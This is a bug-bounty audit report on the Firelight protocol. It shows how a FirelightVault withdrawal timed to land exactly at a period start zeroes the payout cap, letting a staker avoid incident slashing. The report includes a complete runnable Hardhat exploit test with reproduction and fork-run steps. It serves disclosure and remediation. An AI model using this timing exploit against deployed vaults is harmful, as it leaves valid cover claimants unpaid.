# 88287 sc high incorrect period boundary checkpoint accounting in firelightvault withdraw lets stakers evade incident slashing and causes protocol insolvency

**Submitted on Aug 12th 2026 at 15:48:23 UTC by @ngosytuan for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88287
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  * Protocol insolvency

## Description

## Brief/Intro

`FirelightVault` uses `totalAssetsAt(periodStart)` both to determine cover capacity and to cap incident payouts. A withdrawal executed at `block.timestamp == periodStart` is already classified as a withdrawal made during the new period and remains in `withdrawAssets[newPeriod + 1]`, which `payout()` expressly includes as payable for that period. However, `withdraw()` also writes the post-withdraw active balance at exactly `periodStart`, and `totalAssetsAt()` performs an inclusive `<=` checkpoint lookup. The result is contradictory accounting: the assets remain physically held and payable, but the exposure cap becomes zero. The complete PoC in Section 3 uses the real `FirelightVault`, `CoverOrderAllocator`, and `IncidentManager`; an exact valid $200 cover loss pays $100 from a fully funded/approved First-Loss Buffer and $0 from a vault still holding 1,000 FXRP, after which the staker claims all 1,000 FXRP.

**Selected in-scope impact:** Protocol insolvency\
**Affected in-scope contracts:** `FirelightVault.sol`, `CoverOrderAllocator.sol`, `IncidentManager.sol`, and `Checkpoints.sol`\
**Tested branch/commit:** `v1_audit_ready` / `42f9ea5e43d88b35197b901acc2a8c24b314fa62`

## Vulnerability Details

### Root cause

Firelight's withdrawal accounting and payout accounting agree that a withdrawal initiated during capture period `P` remains available for a payout for `P`.

At timestamp equality, `currentPeriod()` has already advanced. `_requestWithdraw()` therefore assigns the request to `currentPeriod() + 1`:

```solidity
// FirelightVault.sol:1008-1019
uint256 period = currentPeriod() + 1;
...
withdrawAssets[period] += assets;
withdrawShares[period] += sharesWithdraw;
withdrawSharesOf[period][receiver] += sharesWithdraw;

pendingWithdrawAssets += assets;
```

For example, a withdrawal at the first timestamp of period 1 is stored in `withdrawAssets[2]`. The underlying tokens are not transferred to the staker at this point; they remain held by the vault throughout the cooldown.

The same `withdraw()` call removes the amount from the active-assets checkpoint:

```solidity
// FirelightVault.sol:755-775
function withdraw(
    uint256 assets,
    address receiver,
    address owner
) public ... returns (uint256) {
    ...
    uint256 ownerBalance = _requestWithdraw(assets, shares, receiver, owner);

    _logTrace(owner, ownerBalance, _totalSupply - shares, _totalAssets - assets, true);
    return shares;
}
```

`_logTrace()` stores the reduced amount under the current block timestamp:

```solidity
// FirelightVault.sol:1044-1055
function _logTrace(
    address owner,
    uint256 balance,
    uint256 _totalSupply,
    uint256 _totalAssets,
    bool isLogAssets
) private {
    uint48 ts = Time.timestamp();
    _traceBalanceOf[owner].push(ts, balance);
    _traceTotalSupply.push(ts, _totalSupply);

    if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
}
```

`totalAssetsAt()` delegates to an inclusive checkpoint lookup:

```solidity
// FirelightVault.sol:456-458
function totalAssetsAt(uint48 timestamp) public view returns (uint256) {
    return _traceTotalAssets.upperLookupRecent(timestamp);
}
```

```solidity
// Checkpoints.sol:217-223
/**
 * Returns the value in the last checkpoint with a key lower or equal
 * than the search key.
 */
function upperLookupRecent(Trace256 storage self, uint48 key)
    internal view returns (uint256)
{
    uint208 idx = self._trace.upperLookupRecent(key);
    return idx > 0 ? self._values[idx] : 0;
}
```

Consequently, if the withdrawal block timestamp equals `periodStart`, the newly written post-withdraw state is included in `totalAssetsAt(periodStart)`. This retroactively changes what should represent the pre-boundary exposure snapshot.

The allocator consumes that value when computing the current period's capacity:

```solidity
// CoverOrderAllocator.sol:704-719
uint256 firstLossBufferUSDCanonical = Decimals.convert(
    config.firstLossBufferToken.balanceOf(config.firstLossBuffer),
    _readDecimals(address(config.firstLossBufferToken)),
    CANONICAL_DECIMALS,
    Math.Rounding.Floor
);
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
    $.vaultAssetDecimals,
    CANONICAL_DECIMALS,
    Math.Rounding.Floor
);
uint256 stakedAssetsValueUSDCanonical =
    totalAssetsCanonical.mulDiv(assetPriceUSD, 10 ** $.priceFeedDecimals);
uint256 availableCollateralCanonical =
    firstLossBufferUSDCanonical + stakedAssetsValueUSDCanonical;

uint256 strictCapacity =
    availableCollateralCanonical.mulDiv(config.effectiveLeverage, config.minCAR);
```

The PoC does not make the matcher submit stale or excessive capacity. After the boundary withdrawal, the honest on-chain capacity consists only of the fully funded $100 FLB multiplied by the configured 2x leverage, so the matcher submits exactly $200 and settles exactly $200 of cover.

When a valid $200 assessment is approved, `IncidentManager` first transfers the full $100 FLB balance and then requests the remaining $100 from the vault:

```solidity
// IncidentManager.sol:645-684
if (flbPayerBalance > 0) {
    ...
    flbAmount = Math.min(totalAssessmentLossFlb, flbPayerBalance);
    if (flbAmount > 0) {
        flbToken.safeTransferFrom(flbPayer, receiver, flbAmount);
    }
    ...
    remainderAmount = flbAmountCanonical >= totalAssessmentLoss
        ? 0
        : totalAssessmentLoss - flbAmountCanonical;
}

if (remainderAmount > 0) {
    ...
    vaultPaidAmount = $.vault.payout(
        receiver,
        vaultRequestedAmount,
        captureTimestamp
    );
}
```

`FirelightVault.payout()` correctly finds the 1,000 FXRP in the capture-period withdrawal bucket, but then caps the transfer by the corrupted zero-valued start checkpoint:

```solidity
// FirelightVault.sol:909-927
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 currentActiveAssets = totalAssets();

// Withdrawals requested during the capture period are assigned to
// capturePeriod + 1 and remain payable while payout is allowed.
uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];
...
uint256 activePayableAmount =
    currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(
    amount,
    Math.min(assetsAtCapturePeriod, activePayableAmount)
);
```

In the exploit transaction sequence:

```
assetsAtCapturePeriod      = 0 FXRP
currentActiveAssets        = 0 FXRP
capturePeriodWithdrawals   = 1,000 FXRP
activePayableAmount        = 1,000 FXRP
requested vault remainder = 100 FXRP
paidAmount                 = min(100, min(0, 1,000)) = 0 FXRP
```

The incident is processed with `vaultPaidAmount == 0`, and the withdrawing staker later claims the complete 1,000 FXRP.

### Exploit versus negative control

The PoC executes the same protocol flow twice. The only relevant difference is whether the unprivileged withdrawal is mined at `periodStart` or at `periodStart + 1`:

| Observed state/result                 | Withdrawal at `periodStart` | Withdrawal at `periodStart + 1` |
| ------------------------------------- | --------------------------: | ------------------------------: |
| FXRP physically held after withdrawal |                       1,000 |                           1,000 |
| `withdrawAssets[2]` before payout     |                       1,000 |                           1,000 |
| `totalAssetsAt(periodStart)`          |                           0 |                           1,000 |
| Honest settled cover                  |                        $200 |                            $200 |
| Funded/approved FLB paid              |                        $100 |                            $100 |
| Vault remainder requested             |                    100 FXRP |                        100 FXRP |
| Vault remainder paid                  |                  **0 FXRP** |                    **100 FXRP** |
| Staker claims after cooldown          |              **1,000 FXRP** |                    **900 FXRP** |

This isolates the bug to the inclusive period-start checkpoint. The real payout path charges the pending withdrawal bucket in the `+1` control, as intended.

### Why the disclosed MVP assumptions do not cause this result

* **No malicious or incorrect role action:** the matcher commits the exact $200 capacity reported after the withdrawal, the order settles for exactly $200, and the incident assessment contains one loss equal to that settled cover.
* **No external FLB underfunding or allowance issue:** the FLB wallet holds exactly $100, approves exactly $100, and the complete $100 transfer succeeds before the vault leg.
* **No duplicate or excessive aggregate claim:** there is one NFT-backed cover allocation and one assessment loss equal to its allocation.
* **No stablecoin depeg or collateral drawdown:** both local tokens are valued at $1 for the complete test.
* **No beneficiary-distribution assumption:** the PoC measures the balances received by the configured payout receiver directly on-chain.
* **No unauthorized use of a privileged function:** the only adversarial action is the public `withdraw()` call. All permissioned calls execute their documented normal workflow and stay within the values enforced by the contracts.

The protocol-constraint bypass is that assets explicitly classified by `payout()` as current-period payable assets are excluded by the other half of the same payout formula solely because the withdrawal occurred at timestamp equality.

### Expected behavior

Once `currentPeriod()` has advanced, a withdrawal initiated in that period must not alter the immutable starting exposure used for that same period. Because the assets are stored in `withdrawAssets[capturePeriod + 1]`, a valid payout for the capture period must be able to charge them.

### Actual behavior

At exact timestamp equality, the withdrawal is simultaneously classified as a current-period payable withdrawal and admitted into the inclusive period-start checkpoint. The checkpoint sets the payout cap to zero, so the still-held payable assets cannot be charged.

### Recommended remediation

Use an immutable pre-boundary exposure snapshot consistently in both `CoverOrderAllocator` and `FirelightVault.payout()`. Two suitable approaches are:

1. Add a strict checkpoint lookup that returns the latest value with `checkpoint.timestamp < periodStart`; or
2. Store a dedicated exposure snapshot once per period transition and never allow later transactions at the same timestamp to mutate it.

With the current second-based timestamps, querying the state at `periodStart - 1` is also a direct fix if all period configurations guarantee a nonzero start. Add regression tests for deposit, withdrawal, reward distribution, matching, and payout at `periodStart - 1`, exactly `periodStart`, and `periodStart + 1`.

Changing only the equal-key replacement branch in `Trace256.push()` is insufficient. Even where there was no prior checkpoint at the boundary key, inserting a new checkpoint at `periodStart` still affects the inclusive lookup.

## Impact Details

The demonstrated impact is **Critical: protocol insolvency**.

* A valid $200 settled cover obligation closes after paying only $100. The configured payout receiver suffers an on-chain $100 shortfall.
* The vault holds 1,000 FXRP throughout the payout, and its own accounting includes all 1,000 FXRP in the capture-period payable bucket. The failure is not a lack of funds; the corrupted exposure cap prevents those funds from being used.
* The unprivileged staker retains the exact economic amount denied to the claimant: the boundary case lets the staker claim 1,000 FXRP, whereas the one-second-later control correctly pays 100 FXRP to the receiver and lets the staker claim only 900 FXRP.
* At a 2x configured capacity ratio, cover backed by a funded FLB can leave a vault remainder equal to the FLB amount. The same accounting error can suppress that complete vault leg when the active-assets snapshot is reduced to zero.
* The condition is timing-sensitive: the withdrawal transaction must be included in a block whose EVM timestamp equals a deterministic period boundary. It does not require ordering before a commitment. The honest commitment is created after the withdrawal and uses the exact capacity then reported on-chain.

The PoC uses small numbers only for clarity. The shortfall scales with the legitimate vault remainder of settled cover and can leave valid cover obligations partly unpaid while collateral remains held by the protocol.

## References

* [Firelight Audit Competition scope and known-issue boundaries](https://immunefi.com/audit-competition/audit-comp-firelight-1/scope/)
* [Frozen audit commit](https://github.com/immunefi-team/audit-comp-firelight/tree/42f9ea5e43d88b35197b901acc2a8c24b314fa62)
* [`FirelightVault.totalAssetsAt()`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L450-L458)
* [`FirelightVault.withdraw()`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L746-L778)
* [`FirelightVault._requestWithdraw()`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L995-L1028)
* [`FirelightVault._logTrace()`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1044-L1055)
* [`Checkpoints.Trace256.upperLookupRecent()`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L217-L223)
* [`CoverOrderAllocator._computeAvailableCapacity()`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L689-L724)
* [`IncidentManager._executePayout()`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol#L621-L690)
* [`FirelightVault.payout()`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L900-L927)
* [Periods and Coverage Cycles](https://docs.firelight.finance/core-concepts/periods-and-coverage-cycles)
* [Deployments and Withdrawals](https://docs.firelight.finance/for-stakers/deployments-and-withdrawals)

## Proof of Concept

The complete runnable end-to-end Hardhat PoC is included in this report. It deploys and calls the real in-scope `FirelightVault`, `CoverOrderAllocator`, `CoverNFT`, and `IncidentManager`. Local mocks are used only for the ERC-20 assets and the fixed $1 external price feed; no vulnerable behavior is implemented in a mock. No separate attachment is required.

## Prerequisites

* Node.js and npm
* Dependencies from the audit repository's `package-lock.json`
* No private keys or deployed contract addresses
* For the optional fork run, a read-only Flare RPC endpoint

## Complete PoC source

Save the following code as `test/FirelightVault/PocVault_PeriodStartPayoutBypass.js` in the frozen audit repository.

```javascript
const { time } = require("@nomicfoundation/hardhat-network-helpers");
const { StandardMerkleTree } = require("@openzeppelin/merkle-tree");
const { expect } = require("chai");
const { ethers, upgrades } = require("hardhat");

const { deployVault } = require("../setup/fixtures.js");

async function deployScenario() {
  const {
    token_contract: asset,
    firelight_vault: vault,
    deployer,
    payout_signer: assessmentApprover,
    payout_receiver: payoutReceiver,
    users,
    utils,
  } = await deployVault({ period_configuration_duration: 24 * 60 * 60 });

  const staker = users[0];
  const buyer = users[1];
  const allocatorRole = users[2];
  const deposited = ethers.parseUnits("1000", 6);
  const flbBalance = ethers.parseUnits("100", 6);
  const cover = ethers.parseUnits("200", 18);

  // effectiveLeverage / minCAR = 2x, so the funded $100 FLB provides an honest
  // $200 matching capacity even after the poisoned vault snapshot reports zero.
  const capacityWithVault = ethers.parseUnits("2200", 18);
  const capacityWithoutVault = ethers.parseUnits("200", 18);

  await utils.mintAndApprove(deposited, staker);
  await vault.connect(staker).deposit(deposited, staker.address);

  const MockERC20 = await ethers.getContractFactory("MockERC20");
  const flbToken = await MockERC20.deploy(
    "Mock First Loss Buffer USD",
    "mFLB",
    6,
  );
  const flbPayer = deployer;
  await flbToken.mint(flbPayer.address, flbBalance);

  const PriceFeed = await ethers.getContractFactory("MockAggregatorV3");
  const priceFeed = await PriceFeed.deploy(18, ethers.parseUnits("1", 18));

  const CoverNFT = await ethers.getContractFactory("CoverNFT");
  const coverNFT = await upgrades.deployProxy(
    CoverNFT,
    [
      "Firelight Cover",
      "FLC",
      "",
      deployer.address,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
    ],
    { kind: "transparent" },
  );

  const protocol = "Boundary Protocol";
  const market = ethers.encodeBytes32String("boundary-market");
  const marketId = ethers.keccak256(
    ethers.AbiCoder.defaultAbiCoder().encode(
      ["uint64", "string", "bytes32"],
      [1, protocol, market],
    ),
  );

  const Allocator = await ethers.getContractFactory("CoverOrderAllocator");
  const allocator = await upgrades.deployProxy(
    Allocator,
    [
      {
        vault: vault.target,
        premiumCollector: deployer.address,
        coverNFT: coverNFT.target,
        priceFeedAdapter: priceFeed.target,
        maxPriceAge: 7 * 24 * 60 * 60,
        premiumTokens: [asset.target],
        admin: deployer.address,
        adminRole: deployer.address,
        curatorRole: deployer.address,
        allocatorRole: allocatorRole.address,
        configAdminRole: deployer.address,
        initialProtocolConcentrations: [
          {
            chainId: 1,
            protocol,
            maxProtocolConcentrationBps: 10_000,
          },
        ],
        newMarkets: [{ chainId: 1, protocol, market }],
        capacityConfig: {
          minCAR: 12_000,
          firstLossBufferToken: flbToken.target,
          firstLossBuffer: flbPayer.address,
          effectiveLeverage: 24_000,
          minOrderMarketCoverAmount: 1,
          divergenceToleranceBps: 0,
        },
      },
    ],
    { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
  );
  await coverNFT
    .connect(deployer)
    .grantRole(await coverNFT.MINTER_ROLE(), allocator.target);

  await asset.mintTo(buyer.address, ethers.parseUnits("1", 6));
  await asset.connect(buyer).approve(allocator.target, ethers.MaxUint256);
  await allocator
    .connect(deployer)
    .createCoverOrder(
      buyer.address,
      buyer.address,
      buyer.address,
      asset.target,
      [{ marketId, coverRateAnnual: 500, coverAmount: cover }],
      0,
    );

  const allocation = [[marketId, cover]];
  const tree = StandardMerkleTree.of(
    [[0n, allocation]],
    ["uint256", "(bytes32,uint256)[]"],
  );

  return {
    asset,
    flbToken,
    vault,
    deployer,
    assessmentApprover,
    payoutReceiver,
    staker,
    buyer,
    allocatorRole,
    allocator,
    coverNFT,
    priceFeed,
    marketId,
    tree,
    deposited,
    flbBalance,
    cover,
    capacityWithVault,
    capacityWithoutVault,
  };
}

async function settleCoverAndExecuteExactLoss(
  ctx,
  matchingCapacity,
  incidentRef,
) {
  const {
    asset,
    flbToken,
    vault,
    deployer,
    assessmentApprover,
    payoutReceiver,
    allocatorRole,
    allocator,
    coverNFT,
    priceFeed,
    marketId,
    tree,
    flbBalance,
    cover,
  } = ctx;

  // This is the capacity the honest matcher observes after the boundary block.
  await allocator
    .connect(allocatorRole)
    .commitAllocation(1, tree.root, cover, matchingCapacity);
  await allocator
    .connect(allocatorRole)
    .settleCoverOrder(
      0,
      [{ marketId, allocatedCover: cover }],
      tree.getProof(0),
    );

  const commitment = await allocator.getAllocationCommitment(1);
  const [coverPeriod, allocatedCover] = await allocator.getCoverOrderMarketInfo(
    0,
    marketId,
  );
  expect(commitment.totalAvailableCapacity).to.equal(matchingCapacity);
  expect(commitment.totalDeclaredAllocated).to.equal(cover);
  expect(coverPeriod).to.equal(1n);
  expect(allocatedCover).to.equal(cover);
  expect(await coverNFT.ownerOf(0)).to.equal(ctx.buyer.address);

  const IncidentManager = await ethers.getContractFactory("IncidentManager");
  const incidentManager = await upgrades.deployProxy(
    IncidentManager,
    [
      deployer.address,
      deployer.address,
      assessmentApprover.address,
      deployer.address,
      deployer.address,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
      payoutReceiver.address,
      allocator.target,
      priceFeed.target,
      7 * 24 * 60 * 60,
    ],
    { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
  );

  await vault
    .connect(deployer)
    .grantRole(await vault.PAYOUT_ROLE(), incidentManager.target);
  await vault
    .connect(deployer)
    .grantRole(await vault.INCIDENT_ROLE(), incidentManager.target);

  // The external FLB is both fully funded and fully approved. Its entire $100 balance
  // pays successfully, so the vault is asked only for the valid $100 remainder.
  await flbToken.connect(deployer).approve(incidentManager.target, flbBalance);

  const captureTimestamp = BigInt(await time.latest());
  await incidentManager
    .connect(deployer)
    .createIncident(captureTimestamp, "Exact settled loss", incidentRef);
  await incidentManager
    .connect(deployer)
    .confirmIncident(1, "ipfs://exact-settled-loss");
  await incidentManager
    .connect(deployer)
    .addAssessmentLosses(1, [{ coverTokenId: 0, marketId, amount: cover }]);
  await incidentManager.connect(deployer).submitCurrentAssessment(1);

  const receiverFlbBefore = await flbToken.balanceOf(payoutReceiver.address);
  const receiverAssetBefore = await asset.balanceOf(payoutReceiver.address);
  await incidentManager.connect(assessmentApprover).approveCurrentAssessment(1);

  const [incident] = await incidentManager.getIncident(1);
  return {
    commitment,
    allocatedCover,
    incident,
    flbPaid:
      (await flbToken.balanceOf(payoutReceiver.address)) - receiverFlbBefore,
    vaultAssetPaid:
      (await asset.balanceOf(payoutReceiver.address)) - receiverAssetBefore,
  };
}

describe("PocVault_PeriodStartPayoutBypass", function () {
  this.timeout(240_000);

  it("lets a boundary withdrawal escape the vault leg of an exact valid cover loss", async function () {
    const ctx = await deployScenario();
    const {
      asset,
      flbToken,
      vault,
      deployer,
      staker,
      deposited,
      flbBalance,
      capacityWithoutVault,
    } = ctx;

    const periodOneStart = await vault.currentPeriodEnd();
    expect(await vault.totalAssetsAt(periodOneStart - 1n)).to.equal(deposited);

    // At equality the vault has advanced to period 1. This request belongs to period 1,
    // stays in withdrawAssets[2], and payout() expressly includes that bucket.
    await time.setNextBlockTimestamp(periodOneStart);
    await vault
      .connect(staker)
      .withdraw(deposited, staker.address, staker.address);

    expect(await vault.currentPeriod()).to.equal(1n);
    expect(await vault.currentPeriodStart()).to.equal(periodOneStart);
    expect(await asset.balanceOf(vault.target)).to.equal(deposited);
    expect(await vault.withdrawAssets(2)).to.equal(deposited);
    expect(await vault.totalAssetsAt(periodOneStart)).to.equal(0);
    expect(await flbToken.balanceOf(deployer.address)).to.equal(flbBalance);

    // Honest post-boundary matching uses the $200 capacity actually reported on-chain:
    // funded $100 FLB * 2x effective leverage. No stale/false matcher input is required.
    const result = await settleCoverAndExecuteExactLoss(
      ctx,
      capacityWithoutVault,
      ethers.id("boundary-payout-bypass"),
    );

    const vaultRemainder = ethers.parseUnits("100", 6);
    expect(result.flbPaid).to.equal(flbBalance);
    expect(result.incident.vaultPaidAmount).to.equal(0);
    expect(result.vaultAssetPaid).to.equal(0);

    // All $1,000 is still physically present in the current-period payable bucket, but
    // the corrupted start cap makes the vault return zero for the valid $100 remainder.
    expect(await asset.balanceOf(vault.target)).to.equal(deposited);
    expect(await vault.withdrawAssets(2)).to.equal(deposited);
    const directlyPayable = await vault
      .connect(ctx.assessmentApprover)
      .payout.staticCall(
        ctx.payoutReceiver.address,
        vaultRemainder,
        BigInt(await time.latest()),
      );
    expect(directlyPayable).to.equal(0);

    // The withdrawing staker eventually realizes all collateral instead of taking the
    // $100 loss demonstrated by the one-second-later control.
    await time.increaseTo(periodOneStart + 2n * 24n * 60n * 60n + 1n);
    await vault.connect(staker).claimWithdraw(2);
    expect(await asset.balanceOf(staker.address)).to.equal(deposited);

    console.log(
      "honest committed / settled cover:",
      ethers.formatUnits(result.allocatedCover, 18),
      "USD",
    );
    console.log(
      "funded and approved FLB paid:",
      ethers.formatUnits(result.flbPaid, 6),
      "USD",
    );
    console.log(
      "vault remainder requested / paid:",
      ethers.formatUnits(vaultRemainder, 6),
      "/",
      ethers.formatUnits(result.vaultAssetPaid, 6),
      "FXRP",
    );
    console.log(
      "boundary staker reclaimed:",
      ethers.formatUnits(await asset.balanceOf(staker.address), 6),
      "FXRP",
    );
  });

  it("control: withdrawal at periodStart + 1 pays the same exact loss in full", async function () {
    const ctx = await deployScenario();
    const { asset, vault, staker, deposited, flbBalance, capacityWithVault } =
      ctx;

    const periodOneStart = await vault.currentPeriodEnd();
    await time.setNextBlockTimestamp(periodOneStart + 1n);
    await vault
      .connect(staker)
      .withdraw(deposited, staker.address, staker.address);

    expect(await vault.totalAssetsAt(periodOneStart)).to.equal(deposited);

    const result = await settleCoverAndExecuteExactLoss(
      ctx,
      capacityWithVault,
      ethers.id("start-plus-one-control"),
    );
    const vaultRemainder = ethers.parseUnits("100", 6);

    expect(result.flbPaid).to.equal(flbBalance);
    expect(result.incident.vaultPaidAmount).to.equal(vaultRemainder);
    expect(result.vaultAssetPaid).to.equal(vaultRemainder);
    expect(await vault.withdrawAssets(2)).to.equal(deposited - vaultRemainder);

    await time.increaseTo(periodOneStart + 2n * 24n * 60n * 60n + 1n);
    await vault.connect(staker).claimWithdraw(2);
    expect(await asset.balanceOf(staker.address)).to.equal(
      deposited - vaultRemainder,
    );

    console.log(
      "control committed / settled cover:",
      ethers.formatUnits(result.allocatedCover, 18),
      "USD",
    );
    console.log(
      "control FLB / vault paid:",
      ethers.formatUnits(result.flbPaid, 6),
      "/",
      ethers.formatUnits(result.vaultAssetPaid, 6),
      "USD",
    );
    console.log(
      "control staker reclaimed:",
      ethers.formatUnits(await asset.balanceOf(staker.address), 6),
      "FXRP",
    );
  });
});
```

## Reproduction steps

1. Clone the in-scope repository and check out the frozen audit commit:

```bash
git clone https://github.com/immunefi-team/audit-comp-firelight.git
cd audit-comp-firelight
git checkout 42f9ea5e43d88b35197b901acc2a8c24b314fa62
git rev-parse HEAD
```

Expected commit:

```
42f9ea5e43d88b35197b901acc2a8c24b314fa62
```

2. Create `test/FirelightVault/PocVault_PeriodStartPayoutBypass.js` and paste the complete PoC source included above without modification.
3. Install the locked dependencies:

```bash
npm ci
```

4. Run the PoC on the local Hardhat network:

```bash
npx hardhat test test/FirelightVault/PocVault_PeriodStartPayoutBypass.js
```

5. The exploit test performs these actions:
   1. Deploys the real vault with one-day periods and deposits 1,000 FXRP from an ordinary staker.
   2. Funds the external FLB wallet with $100 and configures the supported `effectiveLeverage / minCAR` ratio to 2x.
   3. Creates one real $200 cover order.
   4. Advances to the exact first timestamp of period 1.
   5. Calls public `withdraw(1,000 FXRP, staker, staker)` from the unprivileged staker before any matching commitment exists.
   6. Verifies that the vault still physically holds 1,000 FXRP and records all of it in `withdrawAssets[2]`, but `totalAssetsAt(periodStart) == 0`.
   7. Reads the resulting honest capacity: $100 funded FLB multiplied by 2x equals $200. The allocator commits exactly $200 and settles exactly $200.
   8. Funds and approves the FLB for the complete $100 first-loss leg.
   9. Creates one incident, submits one assessment loss equal to the settled $200 allocation, and approves it through the real `IncidentManager`.
   10. Verifies that the FLB transfers $100, the manager requests the remaining 100 FXRP from the vault, and the vault pays zero.
   11. Advances through the normal cooldown and verifies that the staker claims all 1,000 FXRP.
   12. Repeats the same flow with the withdrawal at `periodStart + 1`; verifies that the FLB pays $100, the vault pays 100 FXRP, and the staker claims only 900 FXRP.

## Observed local output

```
PocVault_PeriodStartPayoutBypass
honest committed / settled cover: 200.0 USD
funded and approved FLB paid: 100.0 USD
vault remainder requested / paid: 100.0 / 0.0 FXRP
boundary staker reclaimed: 1000.0 FXRP
  ✔ lets a boundary withdrawal escape the vault leg of an exact valid cover loss
control committed / settled cover: 200.0 USD
control FLB / vault paid: 100.0 / 100.0 USD
control staker reclaimed: 900.0 FXRP
  ✔ control: withdrawal at periodStart + 1 pays the same exact loss in full

2 passing
```

## Local Flare-fork verification

The same test was also run against a **local Hardhat fork** pinned to Flare block `67,242,970`. This does not broadcast any transaction to Flare or to a public testnet.

The public RPC can be replaced with any archival/read-capable Flare RPC:

```bash
FORK=1 \
NODE_RPC_URL=https://flare-api.flare.network/ext/C/rpc \
BN=67242970 \
npx mocha --require hardhat/register --timeout 240000 \
  test/FirelightVault/PocVault_PeriodStartPayoutBypass.js
```

Observed fork result:

```
honest committed / settled cover: 200.0 USD
funded and approved FLB paid: 100.0 USD
vault remainder requested / paid: 100.0 / 0.0 FXRP
boundary staker reclaimed: 1000.0 FXRP
  lets a boundary withdrawal escape the vault leg of an exact valid cover loss
control committed / settled cover: 200.0 USD
control FLB / vault paid: 100.0 / 100.0 USD
control staker reclaimed: 900.0 FXRP
  control: withdrawal at periodStart + 1 pays the same exact loss in full

2 passing (1m)
```

## Full-suite verification

The complete repository test suite passes with the PoC present:

```bash
npm test
```

```
450 passing
```

No production contract was modified. No transaction was sent to mainnet or a public testnet.
